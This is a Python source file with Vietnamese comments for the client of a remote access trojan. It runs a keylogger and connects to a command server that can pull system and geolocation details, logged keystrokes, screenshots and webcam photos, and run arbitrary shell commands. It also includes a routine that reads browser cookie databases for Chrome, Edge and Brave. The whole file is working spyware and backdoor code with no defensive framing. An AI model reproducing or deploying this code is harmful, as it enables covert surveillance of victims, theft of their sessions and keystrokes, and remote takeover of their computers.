import socket
import os
import platform
import psutil
import threading
from pynput import keyboard
import time
import pyautogui  # Thư viện để chụp ảnh màn hình
import requests
import cv2  # Thư viện để xử lý webcam
import sqlite3
import os

# Biến toàn cục để lưu log keylogger
key_log = []

# Keylogger function
def start_keylogger():
    def on_press(key):
        global key_log
        try:
            key_log.append(key.char)
        except AttributeError:
            key_log.append(f"[{key}]")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Thu thập thông tin hệ thống

def find_cookies():
    cookies_info = []

    if os.name == "nt":  # Windows
        paths = {
            "Chrome": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Cookies"),
            "Edge": os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"),
            "Brave": os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies"),
        }
    else:  # macOS/Linux
        paths = {
            "Chrome": os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies"),
            "Edge": os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/Cookies"),
            "Brave": os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies"),
        }

    for browser, path in paths.items():
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                cookies = cursor.fetchall()
                conn.close()

                cookies_info.append(f"--- {browser} Cookies ---\n")
                for host, name, value in cookies:
                    cookies_info.append(f"{host}\t{name}\t{value}\n")
            except Exception as e:
                cookies_info.append(f"Error reading cookies from {browser}: {e}\n")

    if cookies_info:
        return "".join(cookies_info)
    else:
        return "No cookies found or access denied."

# Thêm chức năng xử lý lệnh mới
def handle_commands(bot, command):
    if command.lower() == "get_cookies":
        cookies = find_cookies()
        bot.send(cookies.encode())


def get_geolocation(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()

        if data["status"] == "success":
            return {
                "Country": data["country"],
                "Region": data["regionName"],
                "City": data["city"],
                "Lat/Lon": f"{data['lat']}, {data['lon']}",
                "ISP": data["isp"],
            }
        else:
            return {"Error": "Unable to fetch geolocation data"}
    except Exception as e:
        return {"Error": str(e)}

def get_system_info():
    try:
        # Lấy thông tin hệ thống
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        # Lấy IP công cộng
        public_ip = "Không thể lấy IP công cộng"
        try:
            public_ip = requests.get("https://api.ipify.org").text
        except:
            pass

        # Lấy vị trí địa lý từ public IP
        geo_info = get_geolocation(public_ip)

        # Thông tin hệ thống khác
        info = {
            "Hostname": hostname,
            "Public IP": public_ip,
            "Local IP": local_ip,
            "OS": platform.system(),
            "OS Version": platform.version(),
            "CPU": platform.processor(),
            "RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
            "Disk Space": f"{round(psutil.disk_usage('/').total / (1024**3), 2)} GB",
        }

        # Kết hợp thông tin vị trí
        info.update(geo_info)

        # Format thông tin
        info_text = "\n".join(f"┃ {key}: {value}" for key, value in info.items())
        decorated_info = (
            f"┏━━━━━━━━━━━━━ SYSTEM INFO ━━━━━━━━━━━┓\n"
            f"{info_text}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return decorated_info

    except Exception as e:
        return f"Error gathering system info: {e}"

# Chụp ảnh màn hình và gửi về server
def capture_screen(bot):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")

        # Gửi kích thước tệp trước
        file_size = os.path.getsize("screenshot.png")
        bot.sendall(str(file_size).encode() + b"<END>")  # Gửi kích thước file kèm ký hiệu kết thúc

        # Gửi dữ liệu tệp
        with open("screenshot.png", "rb") as f:
            while chunk := f.read(4096):
                bot.sendall(chunk)

        os.remove("screenshot.png")  # Xóa file sau khi gửi
    except Exception as e:
        bot.send(f"Error capturing screen: {e}".encode())

# Chụp ảnh từ webcam và gửi về server
def capture_webcam(bot):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            bot.send(b"Error: Unable to access webcam.")
            return

        ret, frame = cap.read()
        if ret:
            file_name = "webcam_capture.jpg"
            cv2.imwrite(file_name, frame)

            # Gửi kích thước tệp trước
            file_size = os.path.getsize(file_name)
            bot.sendall(str(file_size).encode() + b"<END>")

            # Gửi dữ liệu tệp
            with open(file_name, "rb") as f:
                while chunk := f.read(4096):
                    bot.sendall(chunk)

            os.remove(file_name)  # Xóa file sau khi gửi
        else:
            bot.send(b"Error: Unable to capture image from webcam.")
        cap.release()
    except Exception as e:
        bot.send(f"Error capturing webcam image: {e}".encode())

# Kết nối đến server
def connect_to_server():
    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot.connect(("127.0.0.1", 9999))  # Đổi IP nếu cần

    while True:
        command = bot.recv(1024).decode()
        if command.lower() == "exit":
            print("[-] Disconnected from server.")
            break
        elif command.lower() == "get_info":
            info = get_system_info()
            bot.send(info.encode())
        elif command.lower() == "get_logs":
            global key_log
            logs = "".join(key_log) if key_log else "No logs captured."
            key_log = []  # Reset log sau khi gửi
            bot.send(logs.encode())
        elif command.lower() == "capture_screen":
            capture_screen(bot)
        elif command.lower() == "capture_webcam":
            capture_webcam(bot)
        else:
            try:
                output = os.popen(command).read()
                if output == "":
                    output = "Command executed with no output."
            except Exception as e:
                output = f"Error: {e}"
            bot.send(output.encode())

if __name__ == "__main__":
    # Chạy keylogger ở luồng riêng
    threading.Thread(target=start_keylogger, daemon=True).start()
    connect_to_server()
